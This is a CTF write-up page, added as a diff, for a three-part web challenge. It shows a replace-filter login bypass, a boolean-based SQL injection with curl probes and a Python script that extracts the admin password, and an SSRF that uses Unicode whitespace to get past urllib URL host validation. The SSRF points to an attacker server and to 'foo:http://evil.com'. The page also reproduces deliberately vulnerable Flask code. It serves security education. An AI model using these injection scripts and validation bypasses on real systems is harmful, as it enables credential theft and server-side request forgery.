@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Track (3 challenges)</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>2-3-5</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Wills</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>1/10 - 2/10 - 3/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>The challenge starts with a login page, and nothing more. We are given the python source code for the application.</p>
+<h4 id="part-1-bypassing-poor-validation-methods">Part 1 - Bypassing poor validation methods</h4>
+<p>Here's the relevant source code for the first part of the challenge :</p>
+<pre class="codehilite"><code class="language-python">from flask import Flask, render_template, request, redirect, session, g, url_for
+import urllib.parse
+import sqlite3
+import requests
+
+app = Flask(__name__)
+app.secret_key = &quot;REDACTED&quot;
+
+FLAG1 = &quot;REDACTED&quot;
+FLAG2 = &quot;REDACTED&quot;
+FLAG3 = &quot;REDACTED&quot;
+
+DATABASE = 'eiffel.db'
+
+def connect_db():
+    return sqlite3.connect(DATABASE)
+
+@app.before_request
+def before_request():
+    g.db = connect_db()
+
+@app.teardown_request
+def teardown_request(exception):
+    if hasattr(g, 'db'):
+        g.db.close()
+
+def verify_user(username, password):
+    c = g.db.cursor()
+    c.execute(&quot;SELECT role FROM users WHERE username=? AND password=?&quot;, (username, password))
+    return c.fetchone()
+
+@app.get(&quot;/&quot;)
+def index():
+    if session.get(&quot;username&quot;) is not None:
+        return redirect(url_for('lights'))
+    else:
+        return redirect(url_for('login'))
+
+@app.get(&quot;/login&quot;)
+def login():
+    return render_template('login.html')
+
+@app.post(&quot;/login&quot;)
+def login_post():
+    username = request.form.get(&quot;username&quot;) or &quot;&quot;
+    password = request.form.get(&quot;password&quot;) or &quot;&quot;
+
+    # We've disabled john's account since he's been fired
+    username = username.replace(&quot;john&quot;, &quot;&quot;)
+    role_data = verify_user(username, password)
+    if not role_data:
+        return render_template('login.html', error='Wrong username or password')
+
+    session[&quot;username&quot;] = username
+    session[&quot;role&quot;] = role_data[0]
+
+    return redirect(url_for('lights'))
+
+
+@app.get(&quot;/logout&quot;)
+def logout():
+    session.pop('username')
+    session.pop('role')
+    return redirect(url_for('login'))
+
+lights_db = {
+    1: &quot;off&quot;,
+    2: &quot;off&quot;,
+    3: &quot;on&quot;
+}
+
+users_db = {
+    &quot;admin&quot;: {&quot;password&quot;: &quot;REDACTED&quot;, &quot;role&quot;: &quot;admin&quot;},
+    &quot;john&quot;: {&quot;password&quot;: &quot;johns_super_secret_password&quot;, &quot;role&quot;: &quot;user&quot;}
+}
+
+def init_db():
+    conn = connect_db()
+    c = conn.cursor()
+    c.execute(&quot;CREATE TABLE lights (id INTEGER PRIMARY KEY, status TEXT)&quot;)
+    for id, status in lights_db.items():
+        c.execute(&quot;INSERT INTO lights (id, status) VALUES (?, ?)&quot;, (id, status))
+    c.execute(&quot;CREATE TABLE users (username TEXT PRIMARY KEY, password TEXT, role TEXT)&quot;)
+    for username, info in users_db.items():
+        c.execute(&quot;INSERT INTO users (username, password, role) VALUES (?, ?, ?)&quot;,
+                  (username, info[&quot;password&quot;], info[&quot;role&quot;]))
+    conn.commit()
+
+init_db()
+
+
+@app.get(&quot;/lights&quot;)
+def lights():
+    if session.get(&quot;username&quot;) is not None:
+        if session[&quot;username&quot;] == &quot;admin&quot;:
+            return render_template('lights.html', flag=FLAG2)
+
+        return render_template('lights.html', flag=FLAG1)
+    else:
+        return redirect(url_for('login'))
+</code></pre>
+
+<p>We need to get a valid session for flag 1 and become the admin for flag 2. We see that we already have john's password, but we can't use his username in the login. The string "john" is replaced by an an empty string right before the database query takes place :</p>
+<pre class="codehilite"><code class="language-python"># We've disabled john's account since he's been fired
+username = username.replace(&quot;john&quot;, &quot;&quot;)
+</code></pre>
+
+<p>Since this check is not recursive, we can easily bypass the replace function by sandwiching the string "john" inside itself. The first instance of "john" will be replaced, leaving the string "john" as the username for the database query :
+<code>jjohnohn</code> --&gt; <code>john</code></p>
+<p>This allows us to login and get the first flag :
+<img alt="Flag 1 dashboard" src="/images/unitedctf2025/eiffel1.png" /></p>
+<h4 id="part-2-sql-injection">Part 2 - SQL injection</h4>
+<p>Once a valid session is obtained, we can access another endpoint :</p>
+<pre class="codehilite"><code class="language-python">@app.post(&quot;/lights&quot;)
+def lights_post():
+    if session.get(&quot;username&quot;) is None:
+        return redirect(url_for('login'))
+    id = request.form[&quot;id&quot;] or &quot;&quot;
+    # SQL injection!!!
+    query = f&quot;SELECT status FROM lights WHERE id = '{id}'&quot;
+    try:
+        c = g.db.cursor()
+        result = c.execute(query).fetchall()
+        light_enabled = False
+        if result and result[0][0] == &quot;on&quot;:
+            light_enabled = True
+        return render_template('lights.html', light_status=light_enabled)
+    except Exception as e:
+        print(e)
+        return render_template('lights.html', error=&quot;An error occurred while fetching the light status.&quot;)
+
+
+@app.get(&quot;/admin&quot;)
+def admin():
+    if session.get(&quot;role&quot;) != &quot;admin&quot;:
+        return redirect(url_for('index'))
+    else:
+        return render_template('admin.html')
+</code></pre>
+
+<p>This endpoint takes an <code>id</code> parameter and checks the associated <code>status</code> value inside the database. The lights seen on the web interface map to <code>id</code> values 1, 2 and 3. Only the bottom light (with id equal to 3) has the lights on :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights -H &quot;Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aNauKA.Wkua-gzpA7RqgnKKcqd6uTpnt5Q&quot; -d &quot;id=3&quot; | grep &quot;Selected&quot;
+
+        &lt;div class=&quot;message&quot;&gt;Selected light is: &lt;strong&gt;ON&lt;/strong&gt;&lt;/div&gt;
+</code></pre>
+
+<p>The problem here is that the value coming from our request in the <code>id</code> parameter is directly inserted into the database query without any validation or escaping. This allows us to inject characters that are literally taken as SQL syntax, meaning we can manipulate the logic behind the original query.</p>
+<p>A classic detection of an SQL injection vulnerability is adding a quote inside the query and looking for errors or changes in behavior. We can go one step forward and also add another condition that evaluates to true to see if we get the same behavior : </p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights -H &quot;Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aNauKA.Wkua-gzpA7RqgnKKcqd6uTpnt5Q&quot; -d &quot;id=3' AND 1=1-- -&quot; | grep &quot;Selected&quot;
+
+        &lt;div class=&quot;message&quot;&gt;Selected light is: &lt;strong&gt;ON&lt;/strong&gt;&lt;/div&gt;
+</code></pre>
+
+<p>If the second condition changes to being false and we observe a change in behavior, we'll know that our input had an effect on the query sent to the database :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights -H &quot;Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aNauKA.Wkua-gzpA7RqgnKKcqd6uTpnt5Q&quot; -d &quot;id=3' AND 1=2-- -&quot; | grep &quot;Selected&quot;
+
+        &lt;div class=&quot;message&quot;&gt;Selected light is: &lt;strong&gt;OFF&lt;/strong&gt;&lt;/div&gt;
+</code></pre>
+
+<p>Since we are trying to become the admin user, we'll aim to exfiltrate his password. The plan is to use the lights being ON/OFF as a sign that our second injected condition is true or false. This is called a <strong>boolean-based SQL injection</strong>. This new condition will have to check if the value of the password column in some table containing user information has a specific property (ex: starts with the 'a' character).</p>
+<p>To do this, we can use the <code>EXISTS</code> SQL function to check if the result of a second arbitrary <code>SELECT</code> statement exists. The function will return True/False accordingly. We can use this to first confirm if a table exists by selecting anything from it :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights -H &quot;Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aNauKA.Wkua-gzpA7RqgnKKcqd6uTpnt5Q&quot; -d &quot;id=3' AND EXISTS(SELECT 1 FROM users)-- -&quot; | grep &quot;Selected&quot;
+
+        &lt;div class=&quot;message&quot;&gt;Selected light is: &lt;strong&gt;ON&lt;/strong&gt;&lt;/div&gt;
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights -H &quot;Cookie: session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aNauKA.Wkua-gzpA7RqgnKKcqd6uTpnt5Q&quot; -d &quot;id=3' AND EXISTS(SELECT 1 FROM not_exist)-- -&quot; | grep &quot;Selected&quot; 
+
+        &lt;div class=&quot;message&quot;&gt;Selected light is: &lt;strong&gt;OFF&lt;/strong&gt;&lt;/div&gt;
+</code></pre>
+
+<p>This process of guessing the table and column names is not necessary though, since they are already visible in the python source code. We'll be looking to target the <code>password</code> column from the <code>users</code> table where the username will be <code>admin</code>.</p>
+<p>To deduce the contents of the column, we'll use the SQLite <code>GLOB</code> operator to check if the value corresponds to a certain pattern. To match any character, the <code>*</code> symbol is used. All we have to do is build a <code>SELECT</code> statement that only returns a result when the password column follows the pattern <code>&lt;char_guess&gt;*</code>. Once we find a valid character at that position, we'll move on and check <code>&lt;found_char&gt;&lt;char_guess&gt;*</code> until we've successfully exfiltrated all the characters.</p>
+<p>Here's a basic script to extract the admin password :</p>
+<pre class="codehilite"><code class="language-python">import requests
+from string import ascii_lowercase, digits
+
+# You can modify to whatever charset you'd like, I used this combination after already seeing the password to save time
+chars = &quot;_&quot; + digits + ascii_lowercase
+
+URL = &quot;https://eiffel-lights-control-eb1876f303.challenges.unitedctf.ca/lights&quot;
+passwd = &quot;&quot;
+
+not_found = True
+while not_found:
+   for char in chars:
+      data = {
+         &quot;id&quot;:f&quot;3' and exists(select 1 from users where password glob '{passwd}{char}*' and username='admin');-- -&quot;
+      }
+
+      headers = {
+     &quot;Cookie&quot;:&quot;session=eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiam9obiJ9.aM3l5Q.j2scZ-NnPUhpTpU-z_fvvI6np6U&quot;
+      }
+
+      r = requests.post(url=URL, data=data, headers=headers)
+      if (&quot;ON&quot; in r.text) :
+         passwd += char
+         print(&quot;[+] Password at : &quot; + passwd)
+</code></pre>
+
+<p><em>Note : Another advantage of using the <code>GLOB</code> operator is that it's case sensitive, unlike other comparison operators like <code>LIKE</code>. Not that it matters here though</em></p>
+<p>Here's the script output :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united]
+└─$ python3 sql.py                                       
+[+] Password at : t
+[+] Password at : th
+[+] Password at : th3
+[+] Password at : th3_
+[+] Password at : th3_b
+[+] Password at : th3_b4
+[+] Password at : th3_b4g
+[+] Password at : th3_b4gu
+[+] Password at : th3_b4gu3
+[+] Password at : th3_b4gu3t
+[+] Password at : th3_b4gu3tt
+[+] Password at : th3_b4gu3tt3
+[+] Password at : th3_b4gu3tt3_
+[+] Password at : th3_b4gu3tt3_1
+[+] Password at : th3_b4gu3tt3_1s
+[+] Password at : th3_b4gu3tt3_1s_
+[+] Password at : th3_b4gu3tt3_1s_4
+[+] Password at : th3_b4gu3tt3_1s_4_
+[+] Password at : th3_b4gu3tt3_1s_4_l
+[+] Password at : th3_b4gu3tt3_1s_4_li
+[+] Password at : th3_b4gu3tt3_1s_4_li3
+[+] Password at : th3_b4gu3tt3_1s_4_li3_
+[+] Password at : th3_b4gu3tt3_1s_4_li3_8
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c6
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c63
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c63e
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c63e6
+[+] Password at : th3_b4gu3tt3_1s_4_li3_83c63e62
+</code></pre>
+
+<p>Logging in as admin for the second flag :
+<img alt="Flag 2" src="/images/unitedctf2025/eiffel2.png" /></p>
+<h4 id="part-3-bypassing-url-validation">Part 3 - Bypassing URL validation</h4>
+<p>After becoming admin, we unlock yet another endpoint, this time in the form of a clock service : 
+<img alt="Admin dashboard" src="/images/unitedctf2025/eiffel3.png" /></p>
+<p>Here's the code behind this part :</p>
+<pre class="codehilite"><code class="language-python">@app.post(&quot;/admin&quot;)
+def admin_post():
+    if session.get(&quot;role&quot;) != &quot;admin&quot;:
+        return redirect(url_for('index'))
+
+    # Get the url parameter from the request and append /clock to it 
+    url = request.form.get(&quot;url&quot;) or &quot;&quot;
+    url += &quot;/clock&quot;
+
+    # Uses an external module to parse the given URL into different sections
+    (scheme, host, path, query, fragment) = urllib.parse.urlsplit(url)
+
+    # If this is the host the URL is left intact (no good!)
+    if host == &quot;127.0.0.1:5123&quot;:
+        requestUrl = urllib.parse.urlunsplit(
+            ('http', '127.0.0.1:5123', path, query, fragment))
+    # This is what we want
+    else: 
+        requestUrl = urllib.parse.urlunsplit(('', '', path, query, fragment))
+    # Sends an HTTP request to whatever is inside requestUrl
+    try:  
+        res = requests.get(requestUrl)
+    except Exception as e:
+        return render_template('admin.html', message=&quot;An error occurred while fetching the URL.&quot;)
+    # Win
+    if (&quot;12:00AM&quot; == res.text):
+        return render_template('admin.html', message=&quot;Congratulations, the lights are now on&quot;.format(FLAG3))
+    else:
+        return render_template('admin.html', message=&quot;It is not midnight yet, it is currently {}&quot;.format(res.text))
+</code></pre>
+
+<p>The endpoint uses the <code>urllib</code> module to parse the URL from the request into its different components. It does this to validate that the <code>host</code> section of the URL is equal to a localhost address with a specific port. If it is, the URL is reconstructed and used for the request. If it isn't, the URL gets reconstructed without its scheme or host section, effectively making it a path.</p>
+<p>To get the third flag, we'll need to somehow build a URL that points to a controlled server and returns the response <code>12:00AM</code> while getting around the URL parsing that validates the <code>host</code> portion of the URL. My first reflex was to use a <code>@</code> symbol after the valid host to then append our attacker controlled domain, but it sticks with the current host and the check fails. I also tried playing with the <code>IPv6</code> syntax, but never got anything working.</p>
+<p>Our next idea is to inject a character or modify our URL so that our full URL pointing back to our server gets parsed as a path, query or fragment. We could potentially inject special characters like newlines before the URL in hopes that it breaks the parsing and considers the full URL as a path. </p>
+<p>The idea is to have some sort of blank character that will break parsing while still having a valid URL for the <code>requests.get</code> function. I had <strong>ChatGPT</strong> write me a little script that looped through common Unicode blank-space characters and prepended them to the URL. If the host was empty while the path wasn't after parsing, we knew we probably had a valid character :</p>
+<pre class="codehilite"><code class="language-python">#!/usr/bin/env python3
+
+import urllib.parse
+import unicodedata
+
+WHITESPACE_CODEPOINTS = [
+    0x0009, 0x000A, 0x000B, 0x000C, 0x000D, 0x0020, 0x0085, 0x00A0,
+    0x1680, 0x180E,
+    0x2000, 0x2001, 0x2002, 0x2003, 0x2004, 0x2005, 0x2006, 0x2007,
+    0x2008, 0x2009, 0x200A,
+    0x2028, 0x2029, 0x202F, 0x205F, 0x3000,
+]
+
+TARGET = &quot;http://127.0.0.1:5123&quot;
+
+def uname(ch):
+    try:
+        return unicodedata.name(ch)
+    except ValueError:
+        return &quot;&lt;no name&gt;&quot;
+
+def main():
+    found = []
+    for cp in WHITESPACE_CODEPOINTS:
+        ch = chr(cp)
+        url_val = ch + TARGET
+        url = url_val + &quot;/clock&quot;
+        (scheme, host, path, query, fragment) = urllib.parse.urlsplit(url)
+        if host == &quot;&quot; and len(path) &gt; 0:
+            print(f&quot;HIT: U+{cp:04X} ({cp}) {uname(ch)} -&gt; host is EMPTY, path is {path}&quot;)
+            found.append(cp)
+    if not found:
+        print(&quot;No whitespace in the test set caused host to be empty.&quot;)
+    else:
+        print(f&quot;Total hits: {len(found)}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+<p>We find 20 candidates for our injection :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united]
+└─$ python3 test-parse.py
+HIT: U+0085 (133) &lt;no name&gt; -&gt; host is EMPTY, path is http://127.0.0.1:5123/clock
+HIT: U+00A0 (160) NO-BREAK SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+1680 (5760) OGHAM SPACE MARK -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+180E (6158) MONGOLIAN VOWEL SEPARATOR -&gt; host is EMPTY, path is http://127.0.0.1:5123/clock
+HIT: U+2000 (8192) EN QUAD -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2001 (8193) EM QUAD -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2002 (8194) EN SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2003 (8195) EM SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2004 (8196) THREE-PER-EM SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2005 (8197) FOUR-PER-EM SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2006 (8198) SIX-PER-EM SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2007 (8199) FIGURE SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2008 (8200) PUNCTUATION SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2009 (8201) THIN SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+200A (8202) HAIR SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+2028 (8232) LINE SEPARATOR -&gt; host is EMPTY, path is http://127.0.0.1:5123/clock
+HIT: U+2029 (8233) PARAGRAPH SEPARATOR -&gt; host is EMPTY, path is http://127.0.0.1:5123/clock
+HIT: U+202F (8239) NARROW NO-BREAK SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+205F (8287) MEDIUM MATHEMATICAL SPACE -&gt; host is EMPTY, path is  http://127.0.0.1:5123/clock
+HIT: U+3000 (12288) IDEOGRAPHIC SPACE -&gt; host is EMPTY, path is 　http://127.0.0.1:5123/clock
+Total hits: 20
+</code></pre>
+
+<p>All of these characters should work. To setup our server, we can use a simple python application using <code>Flask</code> that will return the desired text when <code>/clock</code> is visited :    </p>
+<pre class="codehilite"><code class="language-python">from flask import Flask
+
+app = Flask(__name__)
+
+@app.route('/clock', methods=['GET'])
+def clock():
+    return &quot;12:00AM&quot;
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+</code></pre>
+
+<p>To expose our server on the internet, we can use <a href="https://ngrok.com/">ngrok</a> with <code>ngrok tcp 8000</code> :
+<img alt="Ngrok" src="/images/unitedctf2025/eiffel4.png" /></p>
+<p>We can go ahead and copy a unicode character of our choosing <a href="https://www.compart.com/en/unicode/">here</a> and paste it right before our attacker-controlled URL to get the third flag :
+<img alt="Flag 3" src="/images/unitedctf2025/eiffel5.png" /></p>
+<p>Confirmation that our web application was indeed visited by the application :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united]
+└─$ python3 srv.py                                       
+ * Serving Flask app 'srv'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://192.168.219.149:8000
+Press CTRL+C to quit
+127.0.0.1 - - [26/Sep/2025 11:51:47] &quot;GET /clock HTTP/1.1&quot; 200 -
+</code></pre>
+
+<h4 id="code-analysis">Code analysis</h4>
+<p>So why did this work? Let's look at the <code>urlsplit</code> function inside <code>urllib.parse</code> :</p>
+<pre class="codehilite"><code class="language-python">@functools.lru_cache(typed=True)
+def urlsplit(url, scheme='', allow_fragments=True):
+    url, scheme, _coerce_result = _coerce_args(url, scheme)
+    # Only lstrip url as some applications rely on preserving trailing space.
+    # (https://url.spec.whatwg.org/#concept-basic-url-parser would strip both)
+    url = url.lstrip(_WHATWG_C0_CONTROL_OR_SPACE)
+    scheme = scheme.strip(_WHATWG_C0_CONTROL_OR_SPACE)
+
+    for b in _UNSAFE_URL_BYTES_TO_REMOVE:
+        url = url.replace(b, &quot;&quot;)
+        scheme = scheme.replace(b, &quot;&quot;)
+
+    allow_fragments = bool(allow_fragments)
+    netloc = query = fragment = ''
+    i = url.find(':')
+    if i &gt; 0 and url[0].isascii() and url[0].isalpha():
+        for c in url[:i]:
+            if c not in scheme_chars:
+                break
+        else:
+            scheme, url = url[:i].lower(), url[i+1:]
+    if url[:2] == '//':
+        netloc, url = _splitnetloc(url, 2)
+        if (('[' in netloc and ']' not in netloc) or
+                (']' in netloc and '[' not in netloc)):
+            raise ValueError(&quot;Invalid IPv6 URL&quot;)
+        if '[' in netloc and ']' in netloc:
+            _check_bracketed_netloc(netloc)
+    if allow_fragments and '#' in url:
+        url, fragment = url.split('#', 1)
+    if '?' in url:
+        url, query = url.split('?', 1)
+    _checknetloc(netloc)
+    v = SplitResult(scheme, netloc, url, query, fragment)
+    return _coerce_result(v)
+</code></pre>
+
+<p>Pay attention to this part here :</p>
+<pre class="codehilite"><code class="language-python">url = url.lstrip(_WHATWG_C0_CONTROL_OR_SPACE)
+scheme = scheme.strip(_WHATWG_C0_CONTROL_OR_SPACE)
+</code></pre>
+
+<p>The URL we provide is stripped of characters in the <code>_WHATWG_C0_CONTROL_OR_SPACE</code> character set before the URL is split. This set is defined at the beginning of the module :</p>
+<pre class="codehilite"><code class="language-python">_WHATWG_C0_CONTROL_OR_SPACE = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f '
+</code></pre>
+
+<p>This includes all characters from Unicode <code>U+0000</code> to <code>U+001F</code> and the regular ASCII space character. It doesn't include any of the Unicode blank-space characters we found in the <code>U+2000</code> range though, which means they would remain in the URL before the extraction. </p>
+<p>The function attempts to extract the scheme of the URL by checking for the presence of the <code>:</code> character. It then checks the first character of the URL to see if it's an ASCII or alphanumerical character in order to proceed with the extraction :</p>
+<pre class="codehilite"><code class="language-python">i = url.find(':')
+if i &gt; 0 and url[0].isascii() and url[0].isalpha():
+    for c in url[:i]:
+        if c not in scheme_chars:
+            break
+    else:
+        scheme, url = url[:i].lower(), url[i+1:]
+</code></pre>
+
+<p>Our first character is neither, so no scheme is parsed. The next check tries to extract the <code>netloc</code> (Network Location, corresponds to the host and the port) portion of the URL by verifying that the two first characters correspond to <code>//</code> :</p>
+<pre class="codehilite"><code class="language-python">if url[:2] == '//':
+    netloc, url = _splitnetloc(url, 2)
+    if (('[' in netloc and ']' not in netloc) or
+            (']' in netloc and '[' not in netloc)):
+        raise ValueError(&quot;Invalid IPv6 URL&quot;)
+    if '[' in netloc and ']' in netloc:
+        _check_bracketed_netloc(netloc)
+if allow_fragments and '#' in url:
+    url, fragment = url.split('#', 1)
+if '?' in url:
+    url, query = url.split('?', 1)
+</code></pre>
+
+<p>Our URL does not match this condition (at this point the URL should've been trimmed at the end of the previous segment but hasn't because of the failed check), so it remains the same and no scheme or host are parsed. Our URL finally gets placed in the <code>SplitResult</code> function and becomes our <code>path</code> variable, while the <code>scheme</code> and <code>netloc</code> remain empty :</p>
+<pre class="codehilite"><code class="language-python">_checknetloc(netloc)
+v = SplitResult(scheme, netloc, url, query, fragment)
+return _coerce_result(v)
+</code></pre>
+
+<p>Knowing what we know now, a lot of different URLs would have also worked by having a <code>:</code> before the actual URL to pass a dummy scheme and avoid the second check :</p>
+<pre class="codehilite"><code>foo:http://evil.com
+</code></pre>
+
+<p>This was the solution many players had for the third part of the challenge. </p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+</body>
+</html>
